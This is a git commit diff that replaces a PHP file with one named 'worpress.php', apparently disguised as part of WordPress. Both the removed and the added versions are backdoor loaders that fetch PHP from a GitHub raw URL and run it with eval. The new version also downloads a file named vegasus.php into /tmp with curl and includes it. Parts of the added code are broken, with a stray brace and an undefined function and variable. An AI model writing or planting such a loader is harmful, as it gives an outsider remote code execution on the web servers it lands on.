7a166860f9aecbe042e8bb959c469402ba995ca0
tikung6etar <52764541+tikung6etar@users.noreply.github.com>
2026-08-10 10:49:15 +0700

    Update and rename wom.php to worpress.php

--- wom.php
+++
@@ -1,7 +0,0 @@
-<?=//**/**/**//
-$awo = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/';
-  $fgt = 'file_get_contents';
-   $data = $fgt($awo . 'tiny.phtml');
-     $admin = '?>';
-        eval($admin . $data);
-        exit;?>
---
+++ worpress.php
@@ -0,0 +1,10 @@
+<?php 
+$awo = 'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/';
+  $fgt = 'file_get_contents';
+   $data = $fgt($awo . 'vegasus.php');
+     $admin = '?>';
+        eval($admin . $data);
+ex("curl --output /tmp/$fname https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/vegasus.php", "/tmp");}
+include("/tmp/$fname");
+        exit;
+?>
